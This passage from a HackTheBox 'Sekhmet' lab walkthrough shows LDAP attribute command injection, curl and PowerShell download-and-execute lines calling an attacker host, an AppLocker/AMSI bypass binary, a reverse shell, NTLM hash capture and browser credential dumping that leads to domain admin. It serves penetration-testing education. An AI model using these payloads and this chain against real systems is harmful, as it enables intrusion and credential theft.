</pre></table></code></div></div><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/32.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/32.png" class="lazyload" data-proofer-ignore></a></p><p>WIth this ticket, we can check out the shares within the domain, since SMB was open on the host.and we can see that WC-Share is interesting</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>proxychains impacket-smbclient ray.duncan@hope.windcorp.htb <span class="nt">-k</span> <span class="nt">-no-pass</span>
</pre></table></code></div></div><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/33.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/33.png" class="lazyload" data-proofer-ignore></a></p><p>Within this debug-users.txt file, we find an interesting output.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/34.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/34.png" class="lazyload" data-proofer-ignore></a></p><p>I wasn’t sure what to do with this, but we can keep it for now I guess.</p><h2 id="ldap-enum--rce"><span class="mr-2">LDAP Enum + RCE</span><a href="#ldap-enum--rce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>After finding nothing of interest in SMB, I proceeded to perform LDAP enumeration by utilizing the ‘ldapsearch’ command to extract information from the container. To access the necessary permissions, I leveraged the ticket cached for ray.duncan earlier with kinit.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/35.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/35.png" class="lazyload" data-proofer-ignore></a></p><p>Analysing the information, we notice that the numbers and users and numbers we found earlier on the shares are present in the mobile field for users.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/36.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/36.png" class="lazyload" data-proofer-ignore></a></p><p>I was wondering what this parameter was used for, and why was it hinted at. The first thing that comes to mind is testing for RCE or other injection payloads. To modify LDAP entries, we would need to use ldapmodify. This also involves the creation of LDIF files.</p><p>READ MORE HERE : <a href="https://www.digitalocean.com/community/tutorials/how-to-use-ldif-files-to-make-changes-to-an-openldap-system" target="_blank"> How To Use LDIF Files to Make Changes to an OpenLDAP System </a></p><p>I created this LDIF file first to test. Then I updated the entry and was surprised to get a hit back after a minute!</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>dn: <span class="nv">CN</span><span class="o">=</span>Ray Duncan,OU<span class="o">=</span>Development,DC<span class="o">=</span>windcorp,DC<span class="o">=</span>htb
changetype: modify
replace: mobile
mobile: 1<span class="p">;</span>curl http://10.10.14.149/rcecfmed
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ldapmodify <span class="nt">-Y</span> GSSAPI <span class="nt">-H</span> ldap://windcorp.htb <span class="nt">-D</span> <span class="s2">"CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb"</span> <span class="nt">-f</span> change.ldif
</pre></table></code></div></div><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/37.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/37.png" class="lazyload" data-proofer-ignore></a></p><p>This confirms we have RCE. Now, we can attempt to gain a reverse shell on the machine. I tried downloading nc.exe on the machine, and noticed that there was a character limit on the mobile entry. Anyways, downloading the file to C:\Windows\Tasks\ works, but it does not seem to execute to give me my shell.</p><h2 id="amsi--applocker-bypass"><span class="mr-2">AMSI + AppLocker Bypass</span><a href="#amsi--applocker-bypass" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>It’s possible that a Windows security feature was preventing the reverse shell from running on the machine. I attempted to access various directories, including AppLocker, but encountered the same issue. If AppLocker is in use, it’s possible that AMSI is also active, which means we can’t simply use nc.exe to establish the reverse shell. Instead, we may need to create a new executable.</p><p>Due to character limitations, we’ll need to create a .exe file for the reverse shell. To do so, I started searching for potential payloads on a Windows virtual machine. MinatoTW’s repository proved particularly useful in this regard</p><p>MinatoTW github : <a href="https://github.com/MinatoTW/CLMBypassBlogpost" target="_blank">CLMBypassBlogpost</a></p><p>Also you need to read : <a href=" https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/" target="_blank"> Powershell CLM Bypass Using Runspaces </a></p><p>put the CLMBypassBlogpost repository on your Windows VM ,and Within the code of Program.cs, I changed the command executed to download Invoke-PowerShellTcp from our machine.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>String <span class="nb">exec</span> <span class="o">=</span> <span class="s2">"iex(new-object net.webclient).downloadstring('http://10.10.14.149/emsec')"</span><span class="p">;</span>  // Modify <span class="k">for </span>custom commands
</pre></table></code></div></div><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/38.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/38.png" class="lazyload" data-proofer-ignore></a></p><p>Then, we can compile it using csc.exe within our Windows machine.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>C:<span class="se">\W</span>indows<span class="se">\M</span>icrosoft.NET<span class="se">\F</span>ramework<span class="se">\v</span>4.0.30319<span class="se">\c</span>sc.exe /reference:System.Management.Automation.dll Program.cs
</pre></table></code></div></div><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/39.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/39.png" class="lazyload" data-proofer-ignore></a></p><p>Note : you will find System.Management.Automation.dll file CLMBypassBlogpost-master\Bypass\packages\System.Management.Automation.dll.10.0.10586.0\lib\net40 , you can (you can transfer it to the main file)</p><p>We transferred the program.exe to our attacker machine and changed its name to a.exe to ignore any character limitations. If you have Python 3 installed on your Windows virtual machine, you can start a web server with the following command:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python <span class="nt">-m</span> http.server 8000
</pre></table></code></div></div><p>On our attacker machine, we need to create another file containing our shell (I used the Invoke-PowerShellTcp.ps1 script from Nishang Shells), and then start a Python 3 web server :</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/40.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/40.png" class="lazyload" data-proofer-ignore></a></p><p>on root@webserver change the change.ldif as shown below:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>dn: <span class="nv">CN</span><span class="o">=</span>Ray Duncan,OU<span class="o">=</span>Development,DC<span class="o">=</span>windcorp,DC<span class="o">=</span>htb
changetype: modify
replace: mobile
mobile: 1<span class="p">;</span>curl http://10.10.14.149/a.exe <span class="nt">-o</span> C:<span class="se">\W</span>indows<span class="se">\D</span>ebug<span class="se">\w</span>ia
</pre></table></code></div></div><p>and run :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ldapmodify <span class="nt">-Y</span> GSSAPI <span class="nt">-H</span> ldap://windcorp.htb <span class="nt">-D</span> <span class="s2">"CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb"</span> <span class="nt">-f</span> change.ldif
</pre></table></code></div></div><p>When you receive a hint on your Python3 web server, immediately modify change.ldif as shown below to run a.exe:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>dn: <span class="nv">CN</span><span class="o">=</span>Ray Duncan,OU<span class="o">=</span>Development,DC<span class="o">=</span>windcorp,DC<span class="o">=</span>htb
changetype: modify
replace: mobile
mobile: 1<span class="p">;</span>start C:<span class="se">\W</span>indows<span class="se">\D</span>ebug<span class="se">\w</span>ia<span class="se">\a</span>.exe
</pre></table></code></div></div><p>reuse ldapmodify,Then set up your netcat and wait for your shell start:</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/41.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/41.png" class="lazyload" data-proofer-ignore></a></p><hr /> <center><strong><font color="DarkGray"> Eventually, you'll get a shell. </font></strong></center> <center> <a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/emsec.gif" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 400 450'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/emsec.gif" width="400" height="450" class="lazyload" data-proofer-ignore></a> </center><p>Note : The shell is a bit buggy if we leave the LDAP entry that is executing the payload to continue running, so I changed it back to numbers after getting the shell to prevent this from happening.</p><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="enumeration-1"><span class="mr-2">Enumeration</span><a href="#enumeration-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s2">"Domain Admins"</span><span class="w">
</span></pre></table></code></div></div><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/42.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/42.png" class="lazyload" data-proofer-ignore></a></p><p>Seems that bob.wood is both a user and an admin. Perhaps, he is using the same device to switch between user and administrator accounts. We’ll keep this in mind for later.</p><p>I ran WinPEAS within the machine in the C:\Windows\Debug\wia directory to bypass AppLocker once more.</p><p>We can check to see that the NTLM settings are insecure:</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/43.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/43.png" class="lazyload" data-proofer-ignore></a></p><p>NTLMv2 is the legacy protocol that uses the challenge-response method of authenticating users, and this involves sending the user hash. This means that the next step is to intercept this response and capture the hash.</p><h3 id="ntlm-leak"><span class="mr-2">NTLM Leak</span><a href="#ntlm-leak" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>For some reason, it wouldn’t let me authenticate to my own SMB server from the DC. To circumvent this, we can head to the compromised webserver container and run smbserver there.</p><p>First, we can find out the webserver’s domain name:</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/44.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/44.png" class="lazyload" data-proofer-ignore></a></p><p>Then, we can simply use a smbserver binary from here:<a href="https://github.com/ropnop/impacket_static_binaries/releases" target="_blank"> impacket static binaries</a></p><p>Here’s the output of that:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="c"># on webserver container</span>
<span class="nb">chmod</span> +x smbserver
./smbserver share <span class="nb">.</span> <span class="nt">-smb2support</span>

<span class="c"># on DC</span>
net use <span class="se">\\</span>webserver.windcorp.htb<span class="se">\s</span>hare
</pre></table></code></div></div><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/45.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/45.png" class="lazyload" data-proofer-ignore></a></p><p>We can then crack this hash using john or hashcat.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/46.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 934 232'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/46.png" width="934" height="232" class="lazyload" data-proofer-ignore></a></p><h3 id="bobwood"><span class="mr-2">Bob.Wood</span><a href="#bobwood" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now that we have one set of credentials, we can think about how to gain a shell on bob.wood. I tried remote Powershell with the credentials, and found that they were re-used!</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$SecPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'!@p%i&amp;J#iNNo1T2'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="nv">$Cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="p">(</span><span class="s1">'bob.wood'</span><span class="p">,</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="p">)</span><span class="w">
</span><span class="nv">$session</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> 
</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$session</span><span class="w"> </span><span class="nt">-scriptblock</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">whoami</span><span class="w"> </span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/47.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/47.png" class="lazyload" data-proofer-ignore></a></p><p>With this, we can gain another shell on the host using the same binary that bypassed AppLocker and AMSI.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$session</span><span class="w"> </span><span class="nt">-scriptblock</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">C:\Windows\Debug\wia\a.exe</span><span class="w"> </span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/48.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/48.png" class="lazyload" data-proofer-ignore></a></p><h3 id="bobwoodadm"><span class="mr-2">Bob.Woodadm</span><a href="#bobwoodadm" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We already know that Bob.Wood has another account on the domain with administrator privileges. Perhaps the credentials for the administrator are hidden somewhere on this account, perhaps in some file or cache.</p><p>I could not run winPEAS for some reason, always crashed my shell. So I manually enumerated the box. I checked for app caches, hidden files, and browser caches. In the C:\Users\Bob.Wood\AppData\Local\Microsoft\Edge\User Data\Default file, there was a Login Data file which looked rather suspicious.</p><p>There was mention of the bob.woodADM user here.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/49.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/49.png" class="lazyload" data-proofer-ignore></a></p><p>I went to search for Github Repos with tools that could decrypt this thing, and eventually found one here: <a href="https://github.com/moonD4rk/HackBrowserData" target="_blank"> HackBrowserData</a></p><p>This tool would help us decrypt the data we need. We can download this to the machine. We can run this thing, and see that it successfully dumps out data from the browser.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/50.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/50.png" class="lazyload" data-proofer-ignore></a></p><p>And we can find the credentials for bob.woodadm.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/51.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/51.png" class="lazyload" data-proofer-ignore></a></p><p>Now, we can attempt some remote Powershell again.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/52.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/52.png" class="lazyload" data-proofer-ignore></a></p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/53.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/53.png" class="lazyload" data-proofer-ignore></a></p><hr /> <center><strong><font color="DarkGray"> Then, it finally rooted. </font></strong></center> <center> <a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/emsec.gif" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 400 450'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/emsec.gif" width="400" height="450" class="lazyload" data-proofer-ignore></a> </center><hr /></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox-walkthrough/'>HackTheBox Walkthrough</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >HackTheBox</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox-Sekhmet%20Walkthrough%20-%20Mostafa%20Toumi&url=%2Fposts%2FHackTheBox-Sekhmet_%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox-Sekhmet%20Walkthrough%20-%20Mostafa%20Toumi&u=%2Fposts%2FHackTheBox-Sekhmet_%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2FHackTheBox-Sekhmet_%2F&text=HackTheBox-Sekhmet%20Walkthrough%20-%20Mostafa%20Toumi" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=%2Fposts%2FHackTheBox-Sekhmet_%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <a href="http://service.weibo.com/share/share.php?title=HackTheBox-Sekhmet%20Walkthrough%20-%20Mostafa%20Toumi&url=%2Fposts%2FHackTheBox-Sekhmet_%2F" data-toggle="tooltip" data-placement="top" title="Weibo" target="_blank" rel="noopener" aria-label="Weibo"> <i class="fa-fw fab fa-weibo"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/LDAP/">LDAP Lightweight Directory Access Protocol</a><li><a href="/posts/HackTheBox-Sau/">HackTheBox-Sau Walkthrough</a><li><a href="/posts/DNS/">DNS Domain Name System</a><li><a href="/posts/ActiveDirectory_Management_with_Powershell/">Active Directory Management - A PowerShell Journey</a><li><a href="/posts/ADDC-LAB-PART_01/">Active Directory Mastery - A Guide to Windows Server Setup for Penetration Testing</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/dns/">DNS</a> <a class="post-tag" href="/tags/kerberos/">Kerberos</a> <a class="post-tag" href="/tags/ldap3/">ldap3</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ntlm/">NTLM</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/python3/">python3</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HackTheBox-Derailed/"><div class="card-body"> <em class="small" data-ts="1689854400" data-df="ll" > Jul 20, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox-Derailed Walkthrough</h3><div class="text-muted small"><p> Box Info Derailed is an incredibly challenging Linux machine that focuses on exploiting web vulnerabilities, including Stored Cross-Site Scripting, Session Riding, Arbitrary File Inclusion, and...</p></div></div></a></div><div class="card"> <a href="/posts/HackTheBox-Sandworm/"><div class="card-body"> <em class="small" data-ts="1700308800" data-df="ll" > Nov 18, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox-Sandworm Walkthrough</h3><div class="text-muted small"><p> Description : Sandworm presents a challenging journey, starting with PGP signatures and SSTI exploration to gain SSH access as ‘silentobserver.’ Uncovered a Rust script running as root, leveraged a...</p></div></div></a></div><div class="card"> <a href="/posts/HackTheBox-Sau/"><div class="card-body"> <em class="small" data-ts="1703854800" data-df="ll" > Dec 29, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox-Sau Walkthrough</h3><div class="text-muted small"><p> Description : Sau is an easy Hack The Box machine that features two vulnerabilities on its website—SSRF on the main site and OS Command Injection in a locally running website named Maltrail on port...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/ActiveDirectory_Management_with_Powershell/" class="btn btn-outline-primary" prompt="Older"><p>Active Directory Management - A PowerShell Journey</p></a> <a href="/posts/HackTheBox-Derailed/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox-Derailed Walkthrough</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/dns/">DNS</a> <a class="post-tag" href="/tags/kerberos/">Kerberos</a> <a class="post-tag" href="/tags/ldap3/">ldap3</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ntlm/">NTLM</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/python3/">python3</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/EmSec0">Mostafa Toumi</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 